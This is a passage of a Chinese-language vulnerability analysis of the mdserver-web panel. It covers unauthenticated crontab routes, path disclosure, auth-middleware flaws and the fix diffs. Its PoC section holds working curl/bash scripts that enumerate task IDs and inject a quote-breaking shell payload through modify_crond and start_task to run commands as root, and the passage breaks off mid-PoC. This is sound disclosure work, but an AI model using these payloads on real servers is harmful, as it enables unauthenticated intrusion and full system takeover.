# mdserver-web ≤0.18.5 多处未授权访问 + 信息泄露 + RCE 漏洞分析

---

## 漏洞简介

**mdserver-web** 是一款基于 Python/Flask 开发的轻量级 Linux 服务器管理面板，提供网站管理、数据库管理、计划任务（Crontab）调度、文件管理、防火墙配置等功能，支持 Debian/Ubuntu/CentOS/Fedora 等主流 Linux 发行版，项目托管于 GitHub（[midoks/mdserver-web](https://github.com/midoks/mdserver-web)）。

在 commit **`33cabc8e2`（2026-04-15 17:33）** 之前的版本中，存在以下四类安全漏洞：

1. **多处未授权访问（Unauthenticated Access）**：`web/admin/crontab/__init__.py` 中 **8 个路由**在注册时漏写了 `@panel_login_required` 装饰器，任何未登录用户均可直接调用这些接口；`web/admin/site/site_default.py` 中 **1 个路由** 同样缺少认证装饰器。

2. **信息泄露（Information Disclosure）**：未授权的 `/site/get_site_doc` 接口会将服务器上 OpenResty/Nginx 配置文件的绝对路径直接返回给攻击者；`/crontab/get_crond_find` 和 `/crontab/get_data_list` 同样无认证，可枚举任务详情及服务器上托管的网站/数据库列表。

3. **无认证 Shell 注入 → RCE**：`/crontab/modify_crond`（无认证）可将任意 Shell 注入计划任务脚本，`/crontab/start_task`（无认证）可立即触发执行，全程不需要登录凭据。组合利用只需先用 `/crontab/get_crond_find` 枚举到一个有效任务 ID，即可在服务器上执行任意命令。

4. **认证中间件缺陷（Auth Middleware Bypass）**：`panel_login_required` 存在危险默认值（`open:True`）、IP 白名单从未校验、空指针异常等逻辑缺陷；持有合法 `App-Id`/`App-Secret` 的攻击者可完全绕过 Session 认证，访问所有受 `@panel_login_required` 保护的接口，再结合 Shell 注入实现 RCE。

上述漏洞链式组合：**在未获得任何认证凭据的情况下，攻击者即可通过 3 步无认证请求（枚举ID → 注入Shell → 触发执行）实现服务器任意命令执行。**

---

## 漏洞分析

### 一、漏洞发现思路

**（1）关注项目 PR 合并与 commit 差异**

通过审查 GitHub 仓库的 Pull Request 合并记录，发现 **PR #884**（commit `f5fda8b71`，2026-04-15 19:33）在合并前包含两个预备提交：

- `c508c71f6`（2026-04-15 19:28）：`Update __init__.py` —— 修改 `web/admin/crontab/__init__.py`
- `8586dbbe8`（2026-04-15 19:32）：`Update site_default.py` —— 修改 `web/admin/site/site_default.py`

这两个提交描述极为简短，但修改内容均涉及认证装饰器的添加，属于**安全补丁的典型特征**，引发重点关注。

**（2）逐行对比 commit diff，确认漏洞位置**

对比 `c508c71f6` 的 diff（见下方），发现该提交向 `web/admin/crontab/__init__.py` 中的 **8 个已有路由函数** 统一补加了 `@panel_login_required`——这意味着这 8 个路由在此之前**完全无需登录即可访问**。同理，`8586dbbe8` 的 diff 显示 `get_site_doc` 路由也补加了该装饰器。

**（3）追溯历史，确认缺陷引入时间**

进一步查阅 `web/admin/crontab/__init__.py` 的提交历史，确认漏洞自 **2024 年 11 月 20 日**（commit `8ae54e30d`，"update"）起引入，历经约 5 个月未被发现，直到 2026 年 4 月 15 日才由 PR #884 修复。

---

### 二、漏洞一：计划任务模块 8 个路由未授权访问

#### 漏洞 Commit（修复前的状态）

文件：`web/admin/crontab/__init__.py`（`33cabc8e2` 之前）

```python
blueprint = Blueprint('crontab', __name__, url_prefix='/crontab', ...)

@blueprint.route('/index')
@panel_login_required           # ✅ 有认证
def index(): ...

@blueprint.route('/list', methods=['POST'])
@panel_login_required           # ✅ 有认证
def list(): ...

# ─── 以下 8 个路由全部缺少 @panel_login_required ───

@blueprint.route('/logs', methods=['POST'])
def logs():                     # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().cronLog(cron_id)

@blueprint.route('/del', methods=['POST'])
def crontab_del():              # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().delete(cron_id)

@blueprint.route('/del_logs', methods=['POST'])
def del_logs():                 # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().delLogs(cron_id)

@blueprint.route('/set_cron_status', methods=['POST'])
def set_cron_status():          # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().setCronStatus(cron_id)

@blueprint.route('/get_data_list', methods=['POST'])
def get_data_list():            # ❌ 无认证
    stype = request.form.get('type', '')
    return MwCrontab.instance().getDataList(stype)

@blueprint.route('/get_crond_find', methods=['POST'])
def get_crond_find():           # ❌ 无认证
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().getCrondFind(cron_id)

@blueprint.route('/modify_crond', methods=['POST'])
def modify_crond():             # ❌ 无认证（含 url_address 参数）
    request_data['url_address'] = request.form.get('url_address', '')
    ...
    return MwCrontab.instance().modifyCrond(cron_id, request_data)

@blueprint.route('/start_task', methods=['POST'])
def start_task():               # ❌ 无认证（立即触发执行）
    cron_id = request.form.get('id', '')
    return MwCrontab.instance().startTask(cron_id)

@blueprint.route('/add', methods=['POST'])
@panel_login_required           # ✅ 有认证
def add(): ...
```

#### 未授权接口影响分析

| 接口路由 | HTTP 方法 | 功能 | 无认证危害 |
|---------|----------|------|----------|
| `/crontab/logs` | POST | 读取任务执行日志 | **信息泄露**：暴露服务器 cron 执行内容 |
| `/crontab/del` | POST | 删除计划任务 | **破坏性**：任意删除已有任务 |
| `/crontab/del_logs` | POST | 删除任务日志 | 清除痕迹 |
| `/crontab/set_cron_status` | POST | 启用/禁用任务 | 可禁用安全监控、备份等关键任务 |
| `/crontab/get_data_list` | POST | 获取网站/数据库列表 | **信息泄露**：暴露服务器托管资源 |
| `/crontab/get_crond_find` | POST | 获取单条任务详情 | **信息泄露**：任务脚本内容 |
| `/crontab/modify_crond` | POST | 修改计划任务 | **高危**：篡改任务脚本，结合 Shell 注入 → RCE |
| `/crontab/start_task` | POST | 立即触发任务执行 | **高危**：结合篡改接口，立即 RCE |

**关键点**：`/crontab/add`（添加任务）虽有认证保护，但 `/crontab/modify_crond`（修改任务）无认证，攻击者可以直接修改**已有任务**的 `url_address` 并通过 `/crontab/start_task` 触发，**无需添加新任务即可完成 RCE**。

#### 修复 Diff（commit `c508c71f6`）

```diff
 @blueprint.route('/logs', endpoint='logs', methods=['POST'])
+@panel_login_required
 def logs():

 @blueprint.route('/del', endpoint='del', methods=['POST'])
+@panel_login_required
 def crontab_del():

 @blueprint.route('/del_logs', endpoint='del_logs', methods=['POST'])
+@panel_login_required
 def del_logs():

 @blueprint.route('/set_cron_status', endpoint='set_cron_status', methods=['POST'])
+@panel_login_required
 def set_cron_status():

 @blueprint.route('/get_data_list', endpoint='get_data_list', methods=['POST'])
+@panel_login_required
 def get_data_list():

 @blueprint.route('/get_crond_find', endpoint='get_crond_find', methods=['POST'])
+@panel_login_required
 def get_crond_find():

 @blueprint.route('/modify_crond', endpoint='modify_crond', methods=['POST'])
+@panel_login_required
 def modify_crond():

 @blueprint.route('/start_task', endpoint='start_task', methods=['POST'])
+@panel_login_required
 def start_task():
```

---

### 三、漏洞二：`/site/get_site_doc` 未授权访问 + 信息泄露

#### 漏洞代码（`web/admin/site/site_default.py`，`33cabc8e2` 之前）

```python
@blueprint.route('/get_site_doc', endpoint='get_site_doc', methods=['POST'])
# ❌ 缺少 @panel_login_required
def get_site_doc():
    stype = request.form.get('type', '0').strip()
    vlist = []
    vlist.append('')
    vlist.append(mw.getServerDir() + '/openresty/nginx/html/index.html')
    vlist.append(mw.getServerDir() + '/openresty/nginx/html/404.html')
    vlist.append(mw.getServerDir() + '/openresty/nginx/html/index.html')
    vlist.append(mw.getServerDir() + '/web_conf/stop/index.html')
    data = {}
    data['path'] = vlist[int(stype)]          # ← 直接返回服务器绝对路径
    return mw.returnData(True, 'ok', data)
```

#### 危害分析

1. **路径枚举**：`stype` 参数取值 0-4，对应不同路径，无认证即可遍历所有路径，泄露服务器 OpenResty/Nginx 的 webroot 和配置目录结构。
2. **整数越界**：若 `stype` 传入超出列表长度的值（如 `stype=99`），将触发 `IndexError`，导致 500 错误，同时暴露 Python 调用栈信息。
3. **作为 RCE 辅助**：攻击者可借此获取准确的文件路径，配合文件写入类漏洞实施更精确的攻击。

#### 修复 Diff（commit `8586dbbe8`）

```diff
 @blueprint.route('/get_site_doc', endpoint='get_site_doc', methods=['POST'])
+@panel_login_required
 def get_site_doc():
```

---

### 四、漏洞三：认证中间件缺陷（`web/admin/user_login_check.py`）

#### 漏洞代码

```python
def panel_login_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        app_id = request.headers.get('App-Id','')
        app_secret = request.headers.get('App-Secret','')
        if app_id != '' and app_secret != '':
            panel_api = thisdb.getOptionByJson('panel_api', default={"open":True})  # ← ①
            if panel_api['open']:
                return_code = 404
                info = thisdb.getAppByAppId(app_id)
                if app_secret != info['app_secret']:  # ← ②
                    return Response(status=int(return_code))
                return func(*args, **kwargs)  # ← ③ 完全跳过 Session 检查

        if not isLogined():
            ...
        return func(*args, **kwargs)
    return wrapper
```

| 标记 | 问题 |
|------|------|
| ① | **危险默认值**：`default={"open":True}`，数据库选项不存在时默认 API 为开启状态 |
| ② | **空指针**：`app_id` 不存在时 `info` 为 `None`，`None['app_secret']` 触发 `TypeError` → 500 |
| ③ | **IP 白名单未校验**：`white_list` 字段存入 DB 但鉴权代码中从未读取，白名单形同虚设 |

---

### 五、漏洞四：Shell 注入 → 远程代码执行（`web/utils/crontab.py`）

#### 5.1 `modify_crond` 完整代码调用链

理解 RCE 链路，必须先追踪 `POST /crontab/modify_crond` → `POST /crontab/start_task` 的完整内部执行路径。

```
POST /crontab/modify_crond
  └─ MwCrontab.instance().modifyCrond(cron_id, request_data)
       │
       ├─ ① cronCheck(data)                   # 参数校验（见下节）
       │
       ├─ ② info = thisdb.getCrond(cron_id)   # 从 SQLite 查询任务记录
       │       → 若 cron_id 不存在：info = None
       │         → 下一行 info['echo'] 触发 TypeError → 500
       │         ✴️  结论：必须提供数据库中已存在的任务 ID
       │
       ├─ ③ self.removeForCrond(info['echo']) # 从 /var/spool/cron 中移除旧 cron 行
       │
       ├─ ④ thisdb.setCrontabData(cron_id, dbdata)  # 将新数据写入 DB
       │
       └─ ⑤ self.syncToCrond(cron_id)
               └─ getShell(info)              # 用更新后的数据重新生成 Shell 脚本
                    │
                    ├─ stype == 'toUrl':
                    │     shell = head + "curl ... '" + param['url_address'] + "'"
                    │                                  ↑ 直接字符串拼接，无转义
                    │
                    └─ checkScript(shell)     # 黑名单替换（形同虚设）
                         └─ 写入 /www/server/cron/<echo_hash>
```

```
POST /crontab/start_task
  └─ MwCrontab.instance().startTask(cron_id)
       │
       ├─ data = thisdb.getCrond(cron_id)
       ├─ cmd_file = getServerDir() + '/cron/' + data['echo']
       ├─ os.system('chmod +x ' + cmd_file)
       └─ os.system('nohup ' + cmd_file + ' >> ' + cmd_file + '.log 2>&1 &')
            ↑ 直接执行磁盘上的 Shell 脚本，无任何二次校验
```

#### 5.2 为什么必须提供有效的任务 ID

`modifyCrond` 第 43 行（`thisdb.getCrond(cron_id)`）从 SQLite 数据库中查询任务记录，返回值直接被第 60 行使用（`info['echo']`）：

```python
# web/utils/crontab.py: modifyCrond()
info = thisdb.getCrond(cron_id)          # 若不存在则返回 None

if not self.removeForCrond(info['echo']): # ← None['echo'] → TypeError 500
    return mw.returnData(False, '...')
```

```python
# web/thisdb/crontab.py: getCrond()
def getCrond(id):
    # 查不到记录时返回 None（SQLite .find() 的行为）
    return mw.M('crontab').where('id=?', (id,)).field(__field).find()
```

因此：**`cron_id` 必须是数据库中真实存在的记录 ID，否则请求直接以 500 报错结束，Shell 注入无法触发。**

#### 5.3 任务 ID 的特征与枚举策略

| 特征 | 说明 |
|------|------|
| 类型 | SQLite `INTEGER PRIMARY KEY AUTOINCREMENT`，从 **1** 开始递增 |
| 间隔 | 正常情况下连续，从未手动删除时最大 ID ≤ 当前任务数 |
| 枚举接口 | `POST /crontab/get_crond_find`（**无认证**），传 `id=N` |
| 存在判断 | 返回包含 `"name"` 字段的 JSON → 有效；返回 `null` / 空 → 不存在 |

**无认证枚举脚本**（利用另一个未授权接口）：

```bash
# get_crond_find 无需任何认证，可直接枚举所有任务 ID
for i in $(seq 1 50); do
  resp=$(curl -s -X POST http://TARGET:7200/crontab/get_crond_find -d "id=$i")
  # 返回值非 null 且包含 name 字段说明任务存在
  if echo "$resp" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if d and d.get('name') else 1)" 2>/dev/null; then
    echo "[+] Found task id=$i: $(echo $resp | python3 -c "import json,sys; print(json.load(sys.stdin).get('name','?'))")"
  fi
done
```

典型返回值（任务存在）：

```json
{
  "id": 1,
  "name": "daily_backup",
  "type": "day",
  "where1": "",
  "where_hour": "3",
  "where_minute": "0",
  "echo": "a3f1b2c4d5e6...",   ← 磁盘上脚本文件名（md5 hash）
  "status": 1,
  "stype": "toUrl",
  "url_address": "https://example.com/check",
  ...
}
```

任务不存在时返回：`null`

#### 5.4 `modify_crond` 最小参数集与类型约束

`modifyCrond` 调用 `cronCheck(data)` 进行参数校验：

```python
# web/utils/crontab.py: cronCheck()
def cronCheck(self, params):
    # 备份类任务（site/database/logs/path）需要 save 字段
    if params['stype'] in ('site', 'database', 'logs', 'path'):
        if params['save'] == '':
            return False, '保留份数不能为空!'

    # toUrl / 自定义脚本 (sbody) 无此校验 ← 无需 save
    
    if params['type'] == 'day':
        # 需要 hour 和 minute
        if params['hour'] == '': return False, '...'
        if params['minute'] == '': return False, '...'
    
    if params['type'] == 'minute-n':
        # 只需要 where1（间隔分钟数）
        if params['where1'] == '': return False, '...'
    ...
```

**最小可用参数组合**（利用 `type=minute-n` 绕开 `hour`/`minute` 的必填校验）：

| 参数 | 值 | 说明 |
|------|-----|------|
| `id` | `<valid>` | 数据库中存在的任务 ID（必须） |
| `name` | 任意非空字符串 | 可沿用原任务名以降低可见性 |
| `type` | `minute-n` | 每 N 分钟执行；只需 `where1`，无需 `hour`/`minute` |
| `where1` | `1` | 每 1 分钟（cronCheck 只检查非空） |
| `stype` | `toUrl` | 路由到 `curl` 拼接分支；无需 `save` 字段 |
| `url_address` | `'; PAYLOAD; echo '` | **注入点** |
| 其余字段 | 留空 | `name`/`sname`/`sbody`/`backup_to`/`attr`/`save` 均可为空 |

#### 5.5 Shell 注入原理

`getShell()` 中 `stype=toUrl` 分支：

```python
# web/utils/crontab.py: getShell()
if stype == 'toUrl':
    # url_address 直接用单引号包裹后拼入 shell 字符串
    shell = head + "curl -sS --connect-timeout 10 -m 60 '" + param['url_address'] + "'"
```

`checkScript()` 仅替换极少数固定关键词，**无法防御任何真实的 Shell 注入**：

```python
# web/utils/crontab.py: checkScript()
def checkScript(self, shell):
    keys = ['shutdown', 'init 0', 'mkfs', 'passwd',
            'chpasswd', '--stdin', 'mkfs.ext', 'mke2fs']
    for k in keys:
        shell = shell.replace(k, '[***]')  # 简单字符串替换，轻松绕过
    return shell
```

**注入 Payload 构造**：

```
url_address = '; id > /tmp/pwned.txt; echo '
```

拼接后生成的 Shell 脚本片段：

```bash
curl -sS --connect-timeout 10 -m 60 ''; id > /tmp/pwned.txt; echo ''
#                                    ↑↑    ↑ 注入命令执行    ↑↑ 闭合收尾
```

整个脚本写入 `/www/server/cron/<echo_hash>`，然后由 `startTask` 以 `nohup` 方式在后台以 **root** 身份执行。

---

### 六、完整攻击链（无需任何已有凭据）

#### 6.1 攻击时序与接口调用图

```
攻击者（未登录，无任何凭据）
  │
  ├─[0]─ 信息收集（可选，用于规避检测）
  │       POST /crontab/get_data_list    ← 无认证
  │       body: type=site
  │       → 返回服务器所有网站列表
  │         用于了解目标环境、与任务名称对照
  │
  ├─[1]─ 枚举有效任务 ID（关键前置步骤）
  │       POST /crontab/get_crond_find   ← 无认证
  │       body: id=1（从 1 开始递增尝试）
  │       │
  │       ├── 返回 null → 该 ID 不存在，尝试 id=2, 3...
  │       └── 返回 JSON（含 name/echo/stype 等字段）
  │               → 记录 ID、name、type、where1、hour、minute
  │               ✴️ modify_crond 在 modifyCrond() 第43行调用
  │                  getCrond(id)，ID 不存在则 info=None，
  │                  第60行 info['echo'] 直接 TypeError 500
  │                  ∴ 此步骤是 RCE 的必要前置条件
  │
  ├─[2]─ 注入恶意 Shell（无认证篡改任务脚本）
  │       POST /crontab/modify_crond     ← 无认证 ⚠️
  │       body:
  │         id=<步骤1获得的有效ID>
  │         name=<任意非空，可沿用原名>
  │         type=minute-n               ← 最小参数类型（只需 where1）
  │         where1=1                    ← cronCheck 仅验证非空
  │         stype=toUrl                 ← 路由到 curl 拼接分支
  │         url_address='; CMD; echo '  ← Shell 注入点
  │       │
  │       内部执行路径：
  │         cronCheck() → OK
  │         getCrond(id) → 取出 info['echo']（shell 脚本文件名）
  │         removeForCrond(echo) → 从 crontab 文件移除旧调度行
  │         setCrontabData() → 写入新参数到 DB
  │         syncToCrond() → getShell() 生成含注入的 shell 脚本
  │                       → checkScript()（黑名单无效）
  │                       → 写入 /www/server/cron/<echo_hash>
  │       → 响应: {"status": true, "msg": "修改计划任务[...]成功"}
  │
  ├─[3]─ 立即触发执行（无认证触发脚本）
  │       POST /crontab/start_task       ← 无认证 ⚠️
  │       body: id=<同上>
  │       │
  │       内部执行：
  │         getCrond(id) → data['echo']
  │         os.system('nohup /www/server/cron/<hash> >> .log 2>&1 &')
  │         ↑ 以 root 身份直接执行已被注入的 shell 脚本
  │       → 响应: {"status": true, "msg": "计划任务【...】已执行!"}
  │
  └─[RCE]─ 服务器以 root 身份执行任意命令 ✅（全程无任何登录凭据）
```

#### 6.2 攻击约束与边界条件

| 约束 | 细节 |
|------|------|
| **必须有效任务 ID** | `modify_crond` 内部 `getCrond(id)` 若返回 `None`，下一行 `info['echo']` 触发 `TypeError` 500，注入失败 |
| **ID 枚举方式** | `get_crond_find`（无认证），从 ID=1 递增；ID 为 SQLite AUTOINCREMENT，通常从 1 开始连续 |
| **任务名称** | `name` 字段必须非空（`len(data['name']) < 1` 会被拒绝），其余内容无限制 |
| **类型参数** | `type=minute-n` + `where1=1` 是通过 `cronCheck` 验证所需参数最少的组合 |
| **stype** | 必须是 `toUrl`（或含注入的 `sbody` 用于自定义脚本分支），才能触发 `curl` 拼接注入 |
| **任务状态** | 任务 `status=0`（已禁用）时 `syncToCrond` 会跳过 cron 注册但仍写入脚本文件，`startTask` 仍可执行 |
| **并发安全** | 多个请求可同时修改并触发，无锁保护 |

---

### 七、漏洞五：API Key 认证绕过 + Shell 注入 RCE（面板 API 开启场景）

> **适用范围**：此漏洞独立于 §二-§六 的无认证路由漏洞，适用于**所有版本（含 PR #884 修复后）**；只要攻击者获得了有效的 `App-Id`/`App-Secret`，即可绕过 `@panel_login_required` 装饰器，访问包括 `/crontab/add` 在内的所有受保护接口，并结合 Shell 注入实现 RCE。

#### 7.1 认证中间件代码分析

```python
# web/admin/user_login_check.py
def panel_login_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        app_id = request.headers.get('App-Id', '')
        app_secret = request.headers.get('App-Secret', '')

        if app_id != '' and app_secret != '':
            # ← ① 危险默认值：open:True
            panel_api = thisdb.getOptionByJson('panel_api', default={"open": True})
            if panel_api['open']:
                return_code = 404
                info = thisdb.getAppByAppId(app_id)
                # ← ② 空指针：app_id 不存在时 info=None，下一行 TypeError→500
                if app_secret != info['app_secret']:
                    return Response(status=int(return_code))
                # ← ③ 认证通过：直接执行目标函数，完全跳过 Session 检查
                return func(*args, **kwargs)
                # ← ④ IP 白名单：white_list 字段写入 DB 但此处从未读取

        if not isLogined():
            ...  # Session 认证路径
        return func(*args, **kwargs)
    return wrapper
```

#### 7.2 四个独立缺陷

| 编号 | 位置 | 问题描述 | 危害 |
|------|------|---------|------|
| ① | `default={"open":True}` | `panel_api` 选项不存在时 API 默认**开启** | 新部署面板未初始化选项时天然可利用 |
| ② | `info['app_secret']` | `app_id` 不存在时 `info=None`，触发 `TypeError` → HTTP 500 | 通过错误信息可判断 app_id 是否有效（oracle） |
| ③ | `return func(*args, **kwargs)` | 凭据验证通过后**完全跳过 Session 认证**，直接执行 | 只要有凭据即可绕过所有路由的登录检查 |
| ④ | `white_list` 字段 | UI 层强制填写 IP 白名单，但鉴权代码中**从未读取** | 白名单形同虚设，任意来源 IP 均可使用凭据 |

#### 7.3 与无认证漏洞的关系

```
攻击场景                      凭据需求       适用版本         可利用接口
─────────────────────────────────────────────────────────────────────
§二-§六 无认证路由漏洞         无需任何凭据   ≤33cabc8e2       8个crontab路由 + get_site_doc
§七 API Key 认证绕过            需App-Id/Secret 所有版本        所有 @panel_login_required 路由
```

> **两者可叠加**：在 `≤33cabc8e2` 的版本中，攻击者既可直接无认证访问未保护路由，也可用 API Key 访问受保护路由（如 `/crontab/add`）；在修复了路由认证的版本中，仅 API Key 路径仍有效。

#### 7.4 API Key 绕过 + Shell 注入攻击链

```
攻击者（已获取 App-Id / App-Secret）
  │
  ├─[1]─ POST /crontab/add
  │       Header: App-Id: <app_id>
  │       Header: App-Secret: <app_secret>
  │       body:
  │         name=pwn_via_api
  │         type=minute-n
  │         where1=1
  │         stype=toUrl
  │         url_address='; CMD; echo '
  │       → panel_login_required 验证 App-Id/Secret → 通过
  │         Session 检查被完全跳过
  │         → 响应: {"status": true, "msg": "添加成功"}
  │
  ├─[2]─ POST /crontab/list（获取新任务 ID）
  │       Header: App-Id / App-Secret
  │       body: p=1&limit=10
  │       → 返回任务列表，从中取出刚添加任务的 ID
  │
  ├─[3]─ POST /crontab/start_task
  │       Header: App-Id / App-Secret
  │       body: id=<新任务ID>
  │       → 立即触发注入的 Shell
  │
  └─[RCE]─ 服务器执行任意命令 ✅
```

#### 7.5 IP 白名单无效验证

面板 UI 添加 API 应用时强制要求填写 IP 白名单，底层存储也有 `white_list` 字段，但 `panel_login_required` 从未读取它：

```python
# web/admin/setting/app.py（UI 层校验）
limit_addr = request.form.get('limit_addr', '').strip()
if limit_addr == '':
    return mw.returnData(False, 'IP限制不能为空!')  # ← UI 强制填写
rid = thisdb.addApp(app_id, app_secret, limit_addr)  # ← 写入 DB

# web/admin/user_login_check.py（鉴权层）
info = thisdb.getAppByAppId(app_id)
# info['white_list'] 从未被读取 ← 白名单字段在鉴权代码中完全缺失
if app_secret != info['app_secret']:  # 只校验 secret，不校验 IP
    return Response(status=404)
return func(*args, **kwargs)  # 直接放行，无 IP 检查
```

---

## 环境搭建

> **优化说明**：官方 `docker/Dockerfile` 会编译安装 PHP 74、OpenResty、MySQL 5.6、phpMyAdmin，耗时约 30-60 分钟。本复现环境仅启动 Flask Web 面板（SQLite 数据库），**无需任何编译，构建时间约 2-5 分钟**。
>
> **漏洞版本锁定**：本环境基于 commit **`33cabc8e2`（2026-04-15 17:33）**，即 PR #883 合并后、PR #884 合并前的状态，包含所有未修复的漏洞。

### 前置条件

| 工具 | 版本要求 |
|------|---------|
| Docker | ≥ 20.10 |
| Docker Compose | ≥ 2.0（`docker compose` 命令） |
| 可用端口 | 7200 |

### 目录结构

```
docker/vuln/
├── Dockerfile          # 基于 python:3.11-slim，无编译依赖
├── docker-compose.yml  # 容器编排
├── entrypoint.sh       # 容器启动脚本（前台 gunicorn）
├── start.sh            # 一键启动
├── stop.sh             # 停止（保留数据）
├── clean.sh            # 完全清理（容器+镜像+网络+卷）
└── README.md           # 本文档
```

### 快速启动

```bash
# 克隆仓库（或使用已克隆版本）
git clone https://github.com/Mr-xn/mdserver-web.git
cd mdserver-web

# 赋予脚本执行权限
chmod +x docker/vuln/start.sh docker/vuln/stop.sh docker/vuln/clean.sh

# 一键启动漏洞环境
bash docker/vuln/start.sh
```

启动成功后终端输出示例：

```
================================================================
  ✅  环境已就绪
================================================================
  面板地址  : http://127.0.0.1:7200/AbCd1234
  用户名    : xk3mfp2a
  密码      : 9rqztwbn
  ℹ️  容器名  : mdserver-web-vuln
  ℹ️  查看日志: docker logs -f mdserver-web-vuln
================================================================
```

### 管理命令速查

```bash
# 启动
bash docker/vuln/start.sh

# 停止（保留数据卷，可再次 start 恢复）
bash docker/vuln/stop.sh

# 完全清理（删除容器 + 镜像 + 网络 + 所有挂载卷）
bash docker/vuln/clean.sh

# 手动进入容器
docker exec -it mdserver-web-vuln bash

# 实时查看面板日志
docker logs -f mdserver-web-vuln

# 查看初始密码
docker exec mdserver-web-vuln cat /www/server/mdserver-web/data/default.pl
```

### 验证漏洞版本（环境检查）

```bash
# 检查当前代码中的漏洞是否存在
docker exec mdserver-web-vuln grep -c "panel_login_required" \
  /www/server/mdserver-web/web/admin/crontab/__init__.py
# 漏洞版本输出: 3（仅 index、list、add 三处有认证）
# 修复版本输出: 11（全部路由有认证）
```

---

## 漏洞复现

> 以下 PoC **全程无需登录**，直接利用未授权路由完成攻击链。

### PoC 一：信息泄露（`/crontab/get_data_list` 未授权）

```bash
# 无需任何认证，直接获取服务器所有网站列表
curl -s -X POST http://127.0.0.1:7200/crontab/get_data_list \
  -d "type=site"
```

预期输出：返回 JSON 格式的网站名称列表，**无需登录即可获取服务器托管资源信息**。

```bash
# 获取数据库列表
curl -s -X POST http://127.0.0.1:7200/crontab/get_data_list \
  -d "type=database"
```

### PoC 二：信息泄露（`/site/get_site_doc` 未授权）

```bash
# 无需认证，泄露服务器 OpenResty/Nginx 配置文件绝对路径
for i in 1 2 3 4; do
  echo "stype=$i:"
  curl -s -X POST http://127.0.0.1:7200/site/get_site_doc \
    -d "type=$i" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('data',{}).get('path',''))"
done
```

预期输出：

```
stype=1: /www/server/openresty/nginx/html/index.html
stype=2: /www/server/openresty/nginx/html/404.html
stype=3: /www/server/openresty/nginx/html/index.html
stype=4: /www/server/web_conf/stop/index.html
```

**无需认证即可枚举服务器关键文件路径。**

### PoC 三：完整 RCE 利用链（全程无需登录）

#### 前置说明

`modify_crond` 内部调用 `getCrond(id)` 查询数据库，若 ID 不存在返回 `None`，紧接着访问 `info['echo']` 会触发 `TypeError`（HTTP 500）。因此：

> **攻击的第一步是通过 `get_crond_find`（同样无认证）枚举出数据库中已有的任务 ID，然后才能进行注入。**

如果目标面板从未创建过任何计划任务，可在复现环境中先预置一条（见下文），真实场景中一般都有默认任务。

---

#### Phase 0：预置初始任务（仅复现环境需要）

```bash
# 在容器内创建一条初始任务，模拟真实面板中已有计划任务的场景
docker exec -it mdserver-web-vuln python3 - << 'EOF'
import sys, os
os.chdir('/www/server/mdserver-web/web')
sys.path.insert(0, '/www/server/mdserver-web/web')
from utils.crontab import crontab as MwCrontab

data = {
    'name': 'daily_nginx_check',
    'type': 'day',
    'where1': '',
    'hour': '3',
    'minute': '0',
    'week': '',
    'save': '',
    'backup_to': 'localhost',
    'stype': 'toUrl',
    'sname': '',
    'sbody': '',
    'url_address': 'https://example.com/healthcheck',
    'attr': '',
}
tid = MwCrontab.instance().add(data)
print(f"[+] 预置任务已创建，ID = {tid}")
EOF
```

---

#### Phase 1：无认证枚举有效任务 ID（`/crontab/get_crond_find`）

`get_crond_find` 接口无认证保护，直接暴露数据库查询结果：

```bash
TARGET="http://127.0.0.1:7200"

echo "[*] 枚举计划任务 ID..."
CRON_ID=""
CRON_NAME=""
CRON_TYPE=""

for i in $(seq 1 50); do
  resp=$(curl -s -X POST "${TARGET}/crontab/get_crond_find" -d "id=${i}")
  # null 或空响应 → 任务不存在
  if [ "${resp}" = "null" ] || [ -z "${resp}" ]; then
    continue
  fi
  # 解析任务元数据
  name=$(echo "${resp}" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('name','') if d else '')" 2>/dev/null)
  if [ -n "${name}" ]; then
    CRON_ID="${i}"
    CRON_NAME="${name}"
    CRON_TYPE=$(echo "${resp}" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('type','day'))" 2>/dev/null)
    echo "[+] 发现任务: ID=${CRON_ID}, name=${CRON_NAME}, type=${CRON_TYPE}"
    echo "    完整任务信息: ${resp}"
    break
  fi
done

if [ -z "${CRON_ID}" ]; then
  echo "[-] 未发现任何任务，请先在面板中创建一条计划任务（或运行 Phase 0）"
  exit 1
fi
```

**`get_crond_find` 响应样例**（任务存在时）：

```json
{
  "id": 1,
  "name": "daily_nginx_check",
  "type": "day",
  "where1": "",
  "where_hour": "3",
  "where_minute": "0",
  "echo": "a3f1b2c4d5e67890abcdef1234567890",
  "status": 1,
  "stype": "toUrl",
  "url_address": "https://example.com/healthcheck",
  "save": "",
  "backup_to": "localhost",
  "sname": "",
  "sbody": "",
  "attr": "",
  "add_time": "2026-04-15 10:00:00",
  "update_time": "2026-04-15 10:00:00"
}
```

> `echo` 字段是磁盘上 Shell 脚本的文件名（双重 MD5 hash），`modify_crond` 内部需要它来移除旧的 cron 行。

---

#### Phase 2：无认证注入恶意 Shell（`/crontab/modify_crond`）

使用 `type=minute-n` + `where1=1` 是通过参数校验（`cronCheck`）的最小参数组合：`toUrl` 类型无需填写 `save`；`minute-n` 类型只需 `where1`，无需 `hour`/`minute`。

```bash
CMD='id > /tmp/pwned.txt && hostname >> /tmp/pwned.txt && whoami >> /tmp/pwned.txt'
# 构造注入 payload：用单引号闭合 curl 命令，插入任意 Shell 指令
PAYLOAD="'; ${CMD}; echo '"

echo "[*] 正在注入恶意 Shell 到任务 ID=${CRON_ID}..."
resp=$(curl -s -X POST "${TARGET}/crontab/modify_crond" \
  -d "id=${CRON_ID}" \
  -d "name=${CRON_NAME}" \
  -d "type=minute-n" \
  -d "where1=1" \
  -d "stype=toUrl" \
  -d "sname=" \
  -d "sbody=" \
  -d "save=" \
  -d "backup_to=localhost" \
  -d "attr=" \
  --data-urlencode "url_address=${PAYLOAD}")

echo "[*] modify_crond 响应: ${resp}"
# 预期: {"status": true, "msg": "修改计划任务[daily_nginx_check]成功"}
```

**内部发生了什么**：

```
modify_crond 接收请求
  ↓
cronCheck({type:'minute-n', where1:'1', stype:'toUrl', ...})
  → where1 非空 → 通过 ✓

info = getCrond(1)
